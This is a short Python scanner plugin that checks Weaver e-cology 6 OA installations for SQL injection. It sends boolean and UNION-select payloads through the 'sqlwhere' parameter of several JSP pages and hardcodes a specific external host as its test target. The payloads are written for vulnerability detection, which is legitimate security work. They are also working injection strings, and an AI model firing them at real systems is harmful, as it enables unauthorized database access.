#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = weaver_e-cology 6 sqli
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0136823

import re

def assign(service, arg):
    if service == 'weaver_oa':
        return True, arg

def audit(arg):
    #1
    payload1 = "web/broswer/SectorInfoBrowser.jsp?sqlwhere=where%201=1%20and%201=2"
    payload2 = "web/broswer/SectorInfoBrowser.jsp?sqlwhere=where%201=1%20and%202=2"
    code1, head1, res1, errcode1, _1 = curl.curl2(arg+payload1)
    code2, head2, res2, errcode2, _2 = curl.curl2(arg+payload2) 
    if code1==200 and code2==200 and len(res1) != len(res2):
        security_hole(_1+' has injection')
    #2
    payloads = ["web/broswer/CustomerTypeBrowser.jsp?sqlwhere=where%201=2%20union%20select%201,2,3*3*3*3*3*3*3*3*3*3*3*3*3*3*3*3*3,4,5,6",
                "web/broswer/CustomerSizeBrowser.jsp?sqlwhere=where%201=2%20union%20select%201,3*3*3*3*3*3*3*3*3*3*3*3*3*3*3*3*3,3",
                "web/broswer/CustomerDescBrowser.jsp?sqlwhere=where%201=2%20union%20select%201,3*3*3*3*3*3*3*3*3*3*3*3*3*3*3*3*3,3",
                "web/broswer/ContacterTitleBrowser.jsp?sqlwhere=where%201=2%20union%20select%201,3*3*3*3*3*3*3*3*3*3*3*3*3*3*3*3*3,3,4,5,6",
                "web/broswer/CityBrowser.jsp?sqlwhere=where%201=2%20union%20select%201,3*3*3*3*3*3*3*3*3*3*3*3*3*3*3*3*3,3,4,5,6"
                ]
    for p in payloads:
        code1, head1, res1, errcode1, _1 = curl.curl2(arg+p)
        if code1==200 and "129140163" in res1:
            security_hole(_1+' has injection')

if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa', 'http://oa.hrlm.com:800/')[1])